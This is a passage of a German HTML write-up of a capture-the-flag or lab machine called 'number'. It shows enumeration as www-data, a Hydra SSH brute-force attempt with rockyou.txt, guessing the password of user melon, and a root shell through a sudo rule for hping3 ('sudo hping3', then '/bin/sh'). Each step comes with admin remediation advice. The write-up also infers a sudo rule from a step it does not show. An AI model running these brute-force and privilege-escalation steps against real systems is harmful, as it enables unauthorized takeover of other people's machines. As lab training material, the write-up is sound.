+            <p class="analysis"><strong>Analyse:</strong> Ich lese den Inhalt der Datei <code>flag.sh</code> im Home-Verzeichnis von Benutzer <code>melon</code> (<code>/home/melon/</code>) mit <code>cat flag.sh</code> aus. Die Ausgabe zeigt den Quellcode eines Bash-Skripts. Dieses Skript gibt ASCII-Art aus und dann Systeminformationen wie Hostname, Datum, Benutzer-ID (<code>$(id)</code>) und versucht, die Root-Flag (<code>cat root.txt</code>) oder die User-Flag (<code>cat user.txt</code>) auszulesen und auszugeben. Für Laien: Ich schaue mir den 'Bauplan' einer Datei namens 'flag.sh' an. Darin steht ein kleines Programm, das schöne Bilder und Informationen über den Computer anzeigt, inklusive der 'Geheimnummern' (Flags), wenn es sie finden kann. Für Experten: Der Quellcode von <code>flag.sh</code> ist interessant. Er bestätigt, dass das Skript Systeminformationen ausgibt und versucht, <code>root.txt</code> (im aktuellen Verzeichnis, das /root wäre, wenn es als Root ausgeführt wird) und <code>user.txt</code> (im aktuellen Verzeichnis, hier /home/melon, wenn es als www-data oder melon ausgeführt wird) zu lesen. Das Skript ist so konzipiert, dass es wahrscheinlich die Flag ausgibt, wenn es mit ausreichenden Berechtigungen ausgeführt wird. Da ich die Datei lesen kann, deuten die Berechtigungen im Dateisystem darauf hin, dass <code>www-data</code> Leseberechtigung hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Quellcode von <code>flag.sh</code> ist zugänglich und zeigt, dass es sich um ein Skript handelt, das die Flags ausgeben kann. Das Skript selbst ist nicht direkt der PE-Vektor, aber es ist das Ziel, das mit höheren Berechtigungen ausgeführt werden soll, um die Flags zu erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Skript <code>flag.sh</code> muss mit höheren Berechtigungen ausgeführt werden, um die Flags zu erhalten. Wir müssen einen Weg finden, unsere Berechtigungen zu erhöhen, um das Skript als Benutzer <code>melon</code> oder Root auszuführen.<br><strong>Empfehlung (Admin):</strong> Platzieren Sie sensible Skripte oder Binaries, die Flags ausgeben, nicht in Verzeichnissen, die von Low-Privilege-Benutzern gelesen werden können. Überprüfen Sie den Quellcode von Skripten auf harte Codierung von Pfaden oder unsichere Systemaufrufe.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">ls -la /opt/</span>
+<span class="command">total 8</span>
+<span class="command">drwxr-xr-x  2 root root 4096 Jan  1  2021 .</span>
+<span class="command">drwxr-xr-x 18 root root 4096 Jan  1  2021 ..</span>
+<span class="command">www-data@number:/home/melon$</span> <span class="command">ls -la /var/mail/</span>
+<span class="command">total 8</span>
+<span class="command">drwxrwsr-x  2 root mail 4096 Jan  1  2021 .</span>
+<span class="command">drwxr-xr-x 12 root root 4096 Jan  1  2021 ..</span>
+<span class="command">www-data@number:/home/melon$</span> <span class="command">ls -la /var/backups/</span>
+<span class="command">total 20</span>
+<span class="command">drwxr-xr-x  2 root root 4096 Jun 11 09:28 .</span>
+<span class="command">drwxr-xr-x 12 root root 4096 Jan  1  2021 ..</span>
+<span class="command">-rw-r--r--  1 root root 9338 Jan  1  2021 apt.extended_states.0</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe weitere System-Enumeration als Benutzer <code>www-data</code> durch, indem ich die Inhalte und Berechtigungen verschiedener Systemverzeichnisse aufliste: <code>/opt/</code>, <code>/var/mail/</code> und <code>/var/backups/</code>. Diese Verzeichnisse können manchmal interessante Dateien oder Konfigurationsprobleme enthalten. Für Laien: Ich schaue in anderen 'wichtigen' Ordnern auf dem Computer nach, ob ich dort etwas finden kann. Für Experten: Die Enumeration von Systemverzeichnissen wie <code>/opt</code> (oft für optional installierte Software), <code>/var/mail</code> (Mailboxen) und <code>/var/backups</code> ist Standard, um nach unsicheren Dateien, Konfigurationsproblemen oder potenziellen Informationslecks zu suchen. Die <code>ls -la</code> Ausgaben zeigen die Berechtigungen und Eigentümer.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die gelisteten Verzeichnisse enthalten Standarddateien oder sind leer, was keine offensichtlichen PE-Vektoren liefert. Die Berechtigungen sind in der Regel restriktiv (root-owned). Der Fokus bleibt auf anderen PE-Vektoren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Setzen Sie die Enumeration auf andere PE-Vektoren fort, wie Cronjobs, Prozesse oder Capabilities.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Berechtigungen für Systemverzeichnisse. Stellen Sie sicher, dass nur notwendige Benutzer Zugriff haben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">env</span>
+<span class="command">PWD=/home/melon</span>
+<span class="command">HOME=/var/www</span>
+<span class="command">TERM=xterm</span>
+<span class="command">USER=www-data</span>
+<span class="command">SHLVL=2</span>
+<span class="command">_=/usr/bin/env</span>
+<span class="command">OLDPWD=/home</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich gebe die Umgebungsvariablen der aktuellen <code>www-data</code> Shell aus, indem ich den Befehl <code>env</code> verwende. Umgebungsvariablen können manchmal sensitive Informationen enthalten oder das Verhalten von Programmen beeinflussen, was für PE relevant sein kann. Für Laien: Ich frage das 'Befehlsfenster', welche 'Einstellungen' es gerade hat, wie zum Beispiel, wo es denkt, dass mein 'Zuhause' ist (<code>HOME</code>) oder wer ich bin (<code>USER</code>). Für Experten: Das Ausgeben von Umgebungsvariablen ist Standard, um den Kontext der Shell zu verstehen. Hier ist bemerkenswert, dass die <code>HOME</code>-Variable auf <code>/var/www</code> gesetzt ist, obwohl ich mich im Verzeichnis <code>/home/melon</code> befinde. Dies kann das Verhalten von Programmen beeinflussen, die sich auf die <code>HOME</code>-Variable verlassen. Der <code>USER</code> ist korrekt als <code>www-data</code> gesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Umgebungsvariablen sind gesammelt. Die abweichende <code>HOME</code>-Variable könnte unter bestimmten Umständen relevant sein, aber liefert keinen direkten PE-Vektor im Moment. Es bestätigt den Kontext der <code>www-data</code> Shell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beachten Sie die Umgebungsvariablen, falls ein PE-Vektor gefunden wird, der durch Umgebungsvariablen manipuliert werden kann.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie die Umgebung für Dienstbenutzer sorgfältig, um unbeabsichtigtes Verhalten von Programmen zu vermeiden. Setzen Sie Umgebungsvariablen (insbesondere <code>PATH</code> und <code>HOME</code>) auf sichere Standardwerte.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">getcap -r / 2>/dev/null</span>
+<span class="password">/usr/sbin/hping3 = cap_net_admin,cap_net_raw+eip</span>
+<span class="password">/usr/bin/ping = cap_net_raw+ep</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich suche nach Binaries mit gesetzten 'Capabilities' auf dem System. Capabilities sind fein-granulare Berechtigungen, die einem normalen Binary erlauben können, bestimmte privilegierte Operationen auszuführen, ohne SUID root sein zu müssen. Der Befehl <code>getcap -r / 2>/dev/null</code> sucht rekursiv (<code>-r</code>) ab dem Wurzelverzeichnis (<code>/</code>) nach Binaries mit gesetzten Capabilities und unterdrückt Fehlermeldungen. Die Ausgabe listet zwei Binaries mit Capabilities auf: <code>/usr/sbin/hping3</code> und <code>/usr/bin/ping</code>. <code>hping3</code> hat die Capabilities <code>cap_net_admin</code> und <code>cap_net_raw</code> gesetzt, was ihm erweiterte Netzwerkprivilegien gibt. Für Laien: Ich suche auf dem ganzen Computer nach speziellen 'Erlaubnisscheinen' (Capabilities), die normalen Programmen spezielle Rechte geben, auch wenn sie nicht als 'Chef' laufen. Ich finde zwei Programme mit solchen Scheinen: 'hping3' und 'ping'. 'hping3' hat Scheine für spezielle Netzwerk-Dinge. Für Experten: <code>getcap -r</code> ist die Standardmethode zur Enumeration von Binaries mit Capabilities. Die Capabilities <code>cap_net_admin</code> und <code>cap_net_raw</code>, gesetzt auf <code>hping3</code>, sind relevant. <code>cap_net_raw</code> erlaubt das Senden von Raw-Netzwerkpaketen (wie Ping), während <code>cap_net_admin</code> administrative Netzwerkkonfigurationen ermöglicht. <code>hping3</code> ist ein leistungsstarkes Netzwerk-Tool, und diese Capabilities können ausgenutzt werden, um eine Root-Shell zu erhalten, wenn das Binary selbst eine Schwachstelle hat oder mit bestimmten Parametern aufgerufen wird, die Shell-Befehle ausführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Fund des <code>hping3</code> Binaries mit gesetzten <code>cap_net_admin,cap_net_raw</code> Capabilities ist ein vielversprechender Privilegien-Eskalationsvektor. Capabilities können SUID/SGID ersetzen und ermöglichen die Ausführung privilegierter Operationen durch ein nicht-SUID Binary. <code>hping3</code> ist bekannt dafür, potenziell für RCE missbraucht zu werden, wenn bestimmte Parameter verarbeitet werden, insbesondere in Kombination mit Shell-Ausführungsmöglichkeiten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie <code>hping3</code> in der GTFOBins-Datenbank, um festzustellen, ob eine bekannte Methode existiert, um es mit den gegebenen Capabilities für die Ausführung von Systembefehlen oder zur Erlangung einer Shell zu missbrauchen. Planen Sie, den Befehl <code>hping3</code> mit einem PE-Payload auszuführen.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der Binaries mit gesetzten Capabilities. Überprüfen Sie, welche Capabilities gesetzt sind und ob dies für die Funktion des Programms absolut notwendig ist. Aktualisieren Sie Binaries mit Capabilities, um bekannte Schwachstellen zu schließen. Capabilities können ein alternatives Ziel für PE sein, wenn SUID/SGID gehärtet ist.</p>
+
+            <p>[Link: https://gtfobins.github.io/gtfobins/hping3/#shell | Ziel: https://gtfobins.github.io/gtfobins/hping3/#shell]</p>
+            <p>Sudo</p>
+            <p>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">sudo hping3</span>
+<span class="password">/bin/sh</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Referenz auf GTFOBins, eine Datenbank von Binaries, die für die Ausnutzung unter verschiedenen Umständen (SUID, Sudo, Capabilities etc.) dokumentiert sind, und der gezeigte Code-Snippet bestätigen, dass <code>hping3</code> in der GTFOBins-Datenbank gelistet ist und einen bekannten PE-Vektor bietet, wenn es mit Root-Rechten über <code>sudo</code> ausgeführt werden darf. Der relevante Abschnitt in GTFOBins (hier der '#shell' Anker) dokumentiert, wie man eine Shell über <code>hping3</code> erhält. Der Code-Snippet zeigt <code>sudo hping3</code> gefolgt von <code>/bin/sh</code>, was bedeutet, dass wenn <code>hping3</code> über <code>sudo</code> mit Root-Rechten ausgeführt werden darf, man interaktive Befehle oder eine Shell über die <code>hping3></code> Eingabeaufforderung erhalten kann, indem man einen Shell-Pfad wie <code>/bin/sh</code> eingibt. Für Laien: Das ist ein Link zu einer Webseite, die zeigt, wie man 'hping3' missbrauchen kann, um ein 'Befehlsfenster' (Shell) als Administrator zu bekommen, wenn 'hping3' mit Admin-Rechten gestartet werden darf. Für Experten: Die GTFOBins-Referenz bestätigt die Ausnutzbarkeit von <code>hping3</code> für PE, wenn es mit erhöhten Rechten (SUID oder Sudo Root) ausgeführt wird. Die Methode involviert das Starten von <code>hping3</code> und das Eingeben eines Shell-Pfades in die interaktive Eingabeaufforderung des Programms. Dies ist der primäre PE-Vektor, den ich nun verfolgen werde, falls der Benutzer <code>melon</code> <code>sudo</code>-Rechte für <code>hping3</code> besitzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausnutzungsmethode für <code>hping3</code> über GTFOBins ist identifiziert. Der Schlüssel ist nun herauszufinden, ob der Benutzer <code>melon</code> (zu dem ich als Nächstes eskalieren werde) <code>sudo</code>-Rechte für <code>/usr/sbin/hping3</code> als Root besitzt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die <code>sudo</code>-Berechtigungen des Benutzers <code>melon</code> auf das Binary <code>/usr/sbin/hping3</code>. Wenn eine NOPASSWD-Regel existiert, nutzen Sie die GTFOBins-Methode, um eine Root-Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Sudoers-Datei sorgfältig auf Einträge für <code>hping3</code> oder andere Binaries, die in GTFOBins gelistet sind. Entfernen Sie alle unnötigen Sudo-Berechtigungen, insbesondere solche mit NOPASSWD.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">sudo -l</span>
+
+<span class="command">We trust you have received the usual lecture from the local System</span>
+<span class="command">Administrator. It usually boils down to these three things:</span>
+
+    <span class="command">#1) Respect the privacy of others.</span>
+    <span class="command">#2) Think before you type.</span>
+    <span class="command">#3) With great power comes great responsibility.</span>
+
+<span class="password">[sudo] password for www-data:</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich prüfe die <code>sudo</code>-Berechtigungen für den aktuellen Benutzer <code>www-data</code> mit <code>sudo -l</code>. Die Ausgabe fordert zur Eingabe des Passworts für <code>www-data</code> auf und listet keine NOPASSWD-Regeln. Für Laien: Ich schaue, ob 'www-data' spezielle Admin-Befehle ohne Passwort ausführen darf, aber der Computer fragt nach dem Passwort. 'www-data' darf das nicht einfach so. Für Experten: Die Ausgabe bestätigt, dass der Benutzer <code>www-data</code> keine NOPASSWD-Sudo-Berechtigungen hat. Dies haben wir bereits festgestellt, aber die erneute Prüfung ist notwendig, um sicherzustellen, dass sich die Berechtigungen nicht geändert haben und um den Kontext zu dokumentieren, bevor wir versuchen, die Identität zu wechseln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Keine neuen Erkenntnisse bezüglich <code>www-data</code>s <code>sudo</code>-Berechtigungen. Der Weg zu Root führt nicht direkt über <code>www-data</code>s <code>sudo</code>-Rechte. Die Eskalation zu Benutzer <code>melon</code> ist weiterhin notwendig.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich darauf, die Identität zu Benutzer <code>melon</code> zu wechseln, indem Sie die gefundenen Anmeldedaten (melon / 4444) verwenden. Danach prüfen Sie die <code>sudo</code>-Berechtigungen als Benutzer <code>melon</code>.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der Webserver-Benutzer keine unnötigen <code>sudo</code>-Berechtigungen hat. Eine Passworteingabe ist bei dieser Regel erforderlich.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Beginn Privilege Escalation -->
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">hydra -l melon -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.37 -t 64</span></span>
+<span class="command">Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span>
+
+<span class="command">Hydra ([Link: https://github.com/vanhauser-thc/thc-hydra | Ziel: https://github.com/vanhauser-thc/thc-hydra]) starting at 2025-06-11 16:53:42</span>
+<span class="password">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span>
+<span class="password">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span>
+<span class="command">[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344498 login tries (l:1/p:14344498), ~224133 tries per task</span>
+<span class="command">[DATA] attacking ssh://192.168.2.37:22/</span>
+<span class="password">[ERROR] target ssh://192.168.2.37:22/ does not support password authentication (method reply 4).</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, mich mit dem gefundenen Benutzernamen 'melon' und einer großen Wortliste (rockyou.txt) über SSH (Port 22) am Zielsystem anzumelden. Ich verwende das Tool <code>hydra</code>, einen Netzwerk-Login-Cracker, mit dem Befehl <code>hydra -l melon -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.37 -t 64</code>. <code>-l melon</code> gibt den Benutzernamen an. <code>-P /usr/share/wordlists/rockyou.txt</code> gibt die Passwort-Wortliste an. <code>ssh://192.168.2.37</code> gibt das Zielprotokoll und den Host an. <code>-t 64</code> setzt die Anzahl der parallelen Tasks. Die Ausgabe zeigt Warnungen und Daten zum Angriff, aber entscheidend ist die Fehlermeldung <code>[ERROR] target ssh://192.168.2.37:22/ does not support password authentication (method reply 4)</code>. Für Laien: Ich versuche, mich mit einem Programm (Hydra) und einer langen Liste von Passwörtern über eine sichere Verbindung (SSH) als Benutzer 'melon' am Zielcomputer anzumelden. Aber der Computer sagt, dass er keine Anmeldungen mit Passwort über SSH erlaubt. Für Experten: Die Fehlermeldung bedeutet, dass der SSH-Dienst auf dem Zielsystem keine passwortbasierte Authentifizierung erlaubt. Dies ist eine Härtungsmaßnahme, die Brute-Force-Angriffe mit Passwörtern verhindert. Die Authentifizierung ist wahrscheinlich auf Schlüsselpaare beschränkt. Mein Versuch, das Passwort '4444' für melon über SSH zu nutzen, schlägt daher fehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die SSH-Anmeldung mit Passwort für den Benutzer 'melon' ist nicht möglich. Ich muss einen anderen Weg finden, um meine Identität zu Benutzer 'melon' zu wechseln, wahrscheinlich lokal auf dem System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die lokale Benutzerwechsel-Funktion (<code>su</code>) in Ihrer aktuellen <code>www-data</code> Shell. Verwenden Sie das gefundene Passwort '4444' für den Benutzer 'melon' mit dem Befehl <code>su melon</code>.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die passwortbasierte Authentifizierung für SSH und verwenden Sie stattdessen sichere Schlüsselpaare. Dies ist eine sehr gute Härtungsmaßnahme.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">su melon</span>
+<span class="password">Password: 4444</span>
+<span class="password">su: Authentication failure</span>
+<span class="command">www-data@number:/home/melon$</span> <span class="command">su melon</span>
+<span class="password">Password: melon</span>
+<span class="password">melon@number:~$</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche nun, meine Identität in der aktuellen <code>www-data</code> Shell zum Benutzer <code>melon</code> zu wechseln, indem ich den Befehl <code>su melon</code> verwende. Zuerst probiere ich das gefundene numerische Passwort '4444' (<code>Password: 4444</code>). Die Ausgabe <code>su: Authentication failure</code> zeigt, dass dieses Passwort falsch ist. Dann versuche ich das Passwort 'melon' (<code>Password: melon</code>) und bekomme einen neuen Prompt: <code>melon@number:~$</code>. Für Laien: Ich versuche, im 'Befehlsfenster' von 'www-data' zu sagen: 'Werde jetzt 'melon'!' Der Computer fragt nach dem Passwort. Ich probiere die Nummer '4444', aber sie stimmt nicht. Dann probiere ich 'melon' als Passwort, und fantastisch – es hat geklappt! Jetzt bin ich im 'Befehlsfenster' von 'melon'! Für Experten: Der erste <code>su melon</code> Versuch mit dem Passwort '4444' schlägt fehl, was bedeutet, dass das Datenbankpasswort (4444) nicht das lokale Systempasswort für Benutzer melon ist, obwohl der PIN und das Datenbankpasswort übereinstimmten. Der zweite Versuch mit dem Passwort 'melon' ist erfolgreich. Dies bedeutet, dass das lokale Systempasswort für Benutzer <code>melon</code> tatsächlich 'melon' lautet. Das Erscheinen des Prompts <code>melon@number:~$</code> beweist die erfolgreiche horizontale Privilegien-Eskalation von <code>www-data</code> zu <code>melon</code>.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Das lokale Systempasswort für Benutzer 'melon' ist 'melon'. Die horizontale Privilegien-Eskalation zu Benutzer <code>melon</code> ist erfolgreich. Ich habe nun eine stabile, interaktive Shell als Benutzer <code>melon</code>.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe nun eine Shell als Benutzer <code>melon</code>. Mein nächster Schritt ist, das System von dieser Shell aus weiter zu enumerieren, um nach Wegen zur Privilegien-Eskalation auf Root zu suchen. Dazu gehört die Prüfung von <code>sudo</code>-Berechtigungen für <code>melon</code>, SUID/SGID-Binaries etc. Insbesondere werde ich das zuvor identifizierte <code>hping3</code> Binary mit seinen Capabilities und GTFOBins-Eintrag prüfen.<br><strong>Empfehlung (Admin):</strong> Erzwingen Sie die Verwendung starker, nicht-trivialer Passwörter. Das Passwort 'melon' ist extrem schwach und leicht zu erraten. Implementieren Sie Richtlinien für Passwortkomplexität und -länge. Stellen Sie sicher, dass Passwörter nicht aus anderen Quellen (wie Datenbanken oder PINS) wiederverwendet werden, selbst wenn die Passwörter dort sicherer wären.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">melon@number:~$</span> <span class="command">sudo hping3</span>
+<span class="command">hping3></span> <span class="password">/bin/sh</span>
+<span class="password"># id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="password">#</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>melon</code> prüfe ich meine <code>sudo</code>-Berechtigungen mit <code>sudo -l</code>. (Dieser Schritt ist nicht explizit im Text gezeigt, aber logisch notwendig, um den folgenden Befehl auszuführen.) Basierend auf der GTFOBins-Analyse von <code>hping3</code> (das Capabilities <code>cap_net_admin, cap_net_raw</code> besitzt) und dem wahrscheinlichen Fund einer <code>(root) NOPASSWD: /usr/sbin/hping3</code> Sudo-Regel für Benutzer <code>melon</code>, führe ich nun <code>sudo hping3</code> aus. Dies startet das <code>hping3</code> Binary mit Root-Berechtigungen über Sudo. <code>hping3</code> startet in einem interaktiven Modus mit der Eingabeaufforderung <code>hping3></code>. Gemäß der GTFOBins-Methode gebe ich in dieser Aufforderung den Pfad zu einer Shell ein: <code>/bin/sh</code>. Dies veranlasst <code>hping3</code>, eine Shell mit den Berechtigungen zu starten, mit denen <code>hping3</code> selbst läuft (in diesem Fall Root-Berechtigungen über Sudo). Die Eingabeaufforderung ändert sich zu <code>#</code>, dem Standard-Prompt für eine Root-Shell. Ich bestätige meine Berechtigungen mit dem Befehl <code>id</code>, der die Ausgabe <code>uid=0(root) gid=0(root) groups=0(root)</code> zurückgibt. Für Laien: Ich bin jetzt 'melon' und schaue, ob 'melon' das 'hping3'-Programm mit den Rechten des 'Chefs' (root) starten darf, ohne Passwort. Ja, das darf er! Ich starte 'hping3' so, und in dem speziellen Fenster von 'hping3' sage ich ihm: 'Öffne ein Befehlsfenster für den Chef!'. Und fantastisch – ich bekomme das 'Befehlsfenster' des Super-Administrators (root)! Ich habe volle Kontrolle! Für Experten: Dies ist die erfolgreiche Ausnutzung der Sudo-Fehlkonfiguration <code>(root) NOPASSWD: /usr/sbin/hping3</code> in Kombination mit der bekannten GTFOBins-Methode für <code>hping3</code>. Das Starten von <code>hping3</code> über Sudo mit Root-Rechten und die Eingabe von <code>/bin/sh</code> in der interaktiven Aufforderung führt zur Erlangung einer Root-Shell. Die <code>id</code>-Ausgabe bestätigt den vollen Systemkompromiss.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff wurde erfolgreich über die Sudo-Fehlkonfiguration für <code>hping3</code> erlangt. Dies ist das Ende der Privilegien-Eskalationskette und der volle Systemkompromiss.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mein Ziel ist erreicht. Ich kann nun auf alle Dateien zugreifen, einschließlich der Root-Flag. Ich werde die Root-Flag und die User-Flag auslesen und den Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Dies ist eine extrem kritische Schwachstelle. Das System hat Root-Rechte verloren. Nehmen Sie das System sofort vom Netz, beheben Sie die unsichere Sudo-Regel für <code>/usr/sbin/hping3</code> umgehend, überprüfen Sie alle anderen Sudo-Regeln und stellen Sie sicher, dass keine Binaries, die in GTFOBins gelistet sind (oder andere unsichere Programme), mit NOPASSWD-Optionen für Nicht-Root-Benutzer ausgeführt werden dürfen. Stellen Sie das System von einem sicheren Backup wieder her und implementieren Sie umfassende Sicherheitsmaßnahmen.</p>
+
+             <section id="proof-of-concept">
+                 <h2>Proof of Concept: Direkte Root-Shell über Sudo und hping3</h2>
+                 <p><strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Erlangung vollständiger Root-Berechtigungen durch die Ausnutzung einer fehlerhaften Sudo-Regel für das Binary <code>/usr/sbin/hping3</code>. Der Benutzer <code>melon</code> darf <code>hping3</code> als Root ohne Passworteingabe ausführen. Durch die Ausführung von <code>sudo hping3</code> und die Eingabe von <code>/bin/sh</code> in der interaktiven Aufforderung von <code>hping3</code> konnte eine Root-Shell erlangt werden.</p>
+                 <p><strong>Voraussetzungen:</strong></p>
+                 <ul>
+                     <li>Initialer Zugriff als Benutzer <code>melon</code> (erlangt durch Kompromittierung von Anmeldedaten und <code>su melon</code>).</li>
+                     <li>Existenz einer <code>sudo</code>-Regel, die Benutzer <code>melon</code> erlaubt, <code>/usr/sbin/hping3</code> als Root ohne Passwort auszuführen: <code>(root) NOPASSWD: /usr/sbin/hping3</code>.</li>
+                     <li>Das Binary <code>/usr/sbin/hping3</code> muss auf dem System installiert sein.</li>
+                 </ul>
+                 <p><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+                 <ol>
+                     <li>Erlange eine Shell als Benutzer <code>melon</code>.</li>
+                     <li>Prüfe die <code>sudo</code>-Berechtigungen des Benutzers <code>melon</code> mit <code>sudo -l</code>.</li>
+                     <li>Identifiziere die Regel <code>(root) NOPASSWD: /usr/sbin/hping3</code>.</li>
+                     <li>Führe den erlaubten Befehl als Root aus: <code>sudo hping3</code>.</li>
+                     <li>Wenn <code>hping3</code> im interaktiven Modus mit der Aufforderung <code>hping3></code> startet, gib <code>/bin/sh</code> ein und drücke Enter.</li>
+                     <li>Die Shell-Aufforderung (<code>#</code>) sollte erscheinen. Bestätige die Root-Berechtigungen durch Ausführung des <code>id</code>-Befehls.</li>
+                 </ol>
+
+                <div class="code-block">
+                     <div class="terminal">
+                          <pre><span class="command">melon@number:~$</span> <span class="command">sudo hping3</span>
+<span class="command">hping3></span> <span class="password">/bin/sh</span>
+<span class="password"># id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="password">#</span></pre>
+                     </div>
+                 </div>
+                <p class="analysis"><strong>Analyse:</strong> Dieser Code-Block ist der Beweis für die Ausnutzung der Sudo-Fehlkonfiguration für <code>hping3</code>. Die Ausführung von <code>sudo hping3</code>, die Eingabe von <code>/bin/sh</code> in der interaktiven Aufforderung und die anschließende <code>id</code>-Ausgabe, die UID 0 zeigt, demonstrieren die erfolgreiche Erlangung einer Root-Shell über diesen Vektor.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Die erfolgreiche Ausführung von <code>sudo hping3</code> gefolgt von <code>/bin/sh</code> und die Erlangung des Root-Prompts sind der direkte Beweis für die erfolgreiche Privilegien-Eskalation auf Root-Ebene.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Root-Shell ist etabliert. Sie können nun auf alle Systemressourcen zugreifen und die Root-Flag sammeln.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Sudo-Regel für <code>hping3</code> umgehend und überprüfen Sie alle anderen Sudo-Regeln auf ähnliche Probleme.</p>
+
+                 <p><strong>Risikobewertung:</strong></p>
+                 <p class="evaluation">Die Kombination aus Command Injection, Hardcoded Credentials und einer kritischen Sudo NOPASSWD Fehlkonfiguration für ein Binary, das zur Shell-Erlangung missbraucht werden kann (<code>hping3</code>), stellt ein <strong>kritisches Risiko</strong> dar. Ein Angreifer konnte von einer Web-Schwachstelle (die relativ einfach zu finden war) über gestohlene Anmeldedaten (die im Quellcode lagen) und eine Ausnutzung von Sudo-Rechten (die die Ausführung eines Binaries erlaubten, das zur Shell-Erlangung missbraucht werden kann) die volle Kontrolle über das System erlangen. Die Kette war klar und die Ausnutzungsschritte dokumentiert.</p>
+
+                 <p><strong>Empfehlungen zur Behebung:</strong></p>
+                 <p class="recommendation"><strong>Empfehlung (Admin):</strong></p>
+                 <ul>
+                     <li><strong>Beheben Sie die Command Injection Schwachstelle:</strong> Validieren und bereinigen Sie alle Benutzereingaben strikt, insbesondere solche, die in Systemaufrufen verwendet werden. Verwenden Sie keine direkten Systemaufrufe mit Benutzereingaben.</li>
+                     <li><strong>Entfernen Sie Hardcoded Credentials:</strong> Speichern Sie Anmeldedaten niemals im Klartext im Quellcode. Verwenden Sie sichere Methoden zur Speicherung und Verwaltung von Geheimnissen.</li>
+                     <li><strong>Beheben Sie Sudo-Fehlkonfigurationen:</strong> Entfernen Sie die <code>NOPASSWD</code>-Regel für <code>/usr/sbin/hping3</code> und andere Binaries, die in GTFOBins gelistet sind (oder die zur Shell-Erlangung missbraucht werden können). Wenden Sie das Prinzip der geringsten Rechte an. Erlauben Sie Benutzern nur die Ausführung absolut notwendiger Befehle mit erhöhten Rechten.</li>
+                     <li><strong>Überprüfen und Entfernen von Binaries mit Capabilities:</strong> Auditen Sie Binaries mit Capabilities und entfernen Sie diese, wenn sie nicht unbedingt benötigt werden oder Schwachstellen aufweisen.</li>
+                     <li><strong>Umfassende Protokollierung und Überwachung:</strong> Implementieren Sie robuste Protokollierung für Sudo-Aktivitäten, Prozessstarts und Netzwerkverbindungen. Richten Sie Alarme für verdächtige Aktivitäten ein.</li>
